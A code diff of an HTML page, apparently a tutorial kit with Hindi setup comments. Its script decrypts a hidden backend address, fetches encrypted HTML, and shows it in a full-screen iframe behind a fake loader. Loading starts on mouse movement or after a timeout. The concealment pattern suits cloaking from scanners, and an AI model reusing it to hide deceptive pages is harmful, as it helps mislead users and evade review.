@@ -16,11 +16,8 @@
     .loader-bar { width: 200px; height: 4px; background: #e0e0e0; border-radius: 4px; margin: 20px auto 0; overflow: hidden; }
     .loader-bar .fill { height: 100%; width: 0%; background: #6d28d9; animation: load 3s ease-in-out forwards; }
     @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
-    
     #contentiframe { display: none; z-index: 9998; position: fixed; inset: 0; pointer-events: auto; overflow: hidden; background: #fff; }
     #contentiframe iframe { width: 100%; height: 100%; border: 0; }
-    
-    /* Shop Page Styles (अगर सीधा show करना हो तो) */
     #shop { display: none; }
     .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
     .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
@@ -179,76 +176,62 @@
 
   <script>
     // =============================================
-    // 🔑 यहाँ अपनी VALUES डालो (STEP 6 से मिलेंगी)
+    // 🔑 यहाँ अपनी VALUES डालो (Step 5 से मिलेंगी)
     // =============================================
-    const PASSPHRASE = "MySuperStrongPass@2024#Secure";   
-    const URL_KEY = "MyUrlKey2024";                       
-    const ENC_DATA_ORIGIN = "U2FsdGVkX1+h7E8fvpXMQy7B6qR+E+tiXQk00B70jKKS6El16PgV7LzpD1l0IqU2";
+    const PASSPHRASE = "MySuperStrongPass@2024#Secure";   // ⚠️ Step 5 से Copy करो
+    const URL_KEY = "MyUrlKey2024";                       // ⚠️ Step 5 से Copy करो
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19HNpnWLHYvlq+J2MTGnoEBHLRb0VojzFBk+lt/nrnih2hOgv6Lrrmb";             // ⚠️ Step 5 की 'ENCRYPTED_ORIGIN' डालो (बिना Space के)
 
     const MIN_DISPLAY_TIME = 3500; // 3.5 सेकंड
     let lastUrl = null;
     let startTime = null;
 
     function getBackendOrigin() {
-  try {
-    // 🔍 STEP 1: Exact String Check
-    console.log("🔍 ENC_DATA_ORIGIN (Raw):", ENC_DATA_ORIGIN);
-    console.log("🔍 ENC_DATA_ORIGIN Length:", ENC_DATA_ORIGIN.length);
-    console.log("🔍 ENC_DATA_ORIGIN (JSON Stringified):", JSON.stringify(ENC_DATA_ORIGIN));
-    
-    // 🔍 STEP 2: Try to Decrypt
-    const bytes = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY);
-    const origin = bytes.toString(CryptoJS.enc.Utf8);
-    
-    // 🔍 STEP 3: Check Decrypted Result
-    console.log("✅ Decrypted Origin (Raw):", origin);
-    console.log("✅ Decrypted Origin Length:", origin ? origin.length : "null/undefined");
-    console.log("✅ Decrypted Origin (JSON):", JSON.stringify(origin));
-    
-    // 🔍 STEP 4: Check if it's empty or null
-    if (!origin || origin.trim() === "") {
-      console.warn("⚠️ Decrypted Origin is EMPTY or only whitespace!");
-      return null;
+      try {
+        const bytes = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY);
+        const origin = bytes.toString(CryptoJS.enc.Utf8);
+        console.log("✅ Decrypted Origin:", origin);
+        console.log("🔑 ENC_DATA_ORIGIN length:", ENC_DATA_ORIGIN.length);
+        if (!origin || origin.trim() === "") {
+          console.warn("⚠️ Decrypted Origin is EMPTY or only whitespace!");
+          return null;
+        }
+        return origin;
+      } catch (e) {
+        console.error("❌ Origin Decrypt Failed", e);
+        return null;
+      }
     }
-    
-    return origin;
-  } catch (e) {
-    console.error("❌ Origin Decrypt Failed", e);
-    return null;
-  }
-}
 
     async function loadSecureContent() {
       const popup = document.getElementById("customPopup");
       const frame = document.getElementById("frame");
       const iframeContainer = document.getElementById("contentiframe");
-      const shopDiv = document.getElementById("shop");
       
       const origin = getBackendOrigin();
       if (!origin) { 
         popup.innerHTML = `<p style="color:red;">❌ Invalid Config</p>`; 
+        console.error("❌ Origin is null or empty!");
         return; 
       }
 
       try {
         const apiUrl = origin + "/data";
+        console.log("🌐 Fetching from:", apiUrl);
         const response = await fetch(apiUrl);
         if (!response.ok) throw new Error(`API Error: ${response.status}`);
         const data = await response.json();
+        console.log("📦 Received cipher length:", data.cipher ? data.cipher.length : 0);
+        
         const encryptedHTML = data.cipher;
-
         const decryptedBytes = CryptoJS.AES.decrypt(encryptedHTML, PASSPHRASE);
         const decryptedHTML = decryptedBytes.toString(CryptoJS.enc.Utf8);
         if (!decryptedHTML) throw new Error("Decryption Failed");
 
-        // 👇 OPTION 1: Iframe में Show करना (दोस्त वाला)
         if (lastUrl) URL.revokeObjectURL(lastUrl);
         const blob = new Blob([decryptedHTML], { type: "text/html" });
         lastUrl = URL.createObjectURL(blob);
         frame.src = lastUrl;
-
-        // 👇 OPTION 2: Directly Show करना (अगर Shop Page पहले से HTML में है)
-        // shopDiv.innerHTML = decryptedHTML;
 
         const elapsed = Date.now() - startTime;
         const remaining = Math.max(0, MIN_DISPLAY_TIME - elapsed);
@@ -256,25 +239,25 @@
         setTimeout(() => {
           popup.style.display = "none";
           iframeContainer.style.display = "block";
-          // अगर Direct Show करना है तो: shopDiv.style.display = "block";
         }, remaining);
 
       } catch (error) {
+        console.error("❌ Load Error:", error);
         popup.innerHTML = `<p style="color:red;">⚠️ ${error.message}</p>`;
       }
     }
 
-    // Mouse Move पर Trigger (दोस्त वाला)
     window.addEventListener("mousemove", () => {
       if (startTime !== null) return;
       startTime = Date.now();
+      console.log("🖱️ Mouse moved, starting load...");
       loadSecureContent();
     }, { once: true });
 
-    // Fallback: 5 सेकंड बाद Auto-Start
     setTimeout(() => {
       if (startTime === null) {
         startTime = Date.now();
+        console.log("⏰ Auto-start after 5 seconds...");
         loadSecureContent();
       }
     }, 5000);
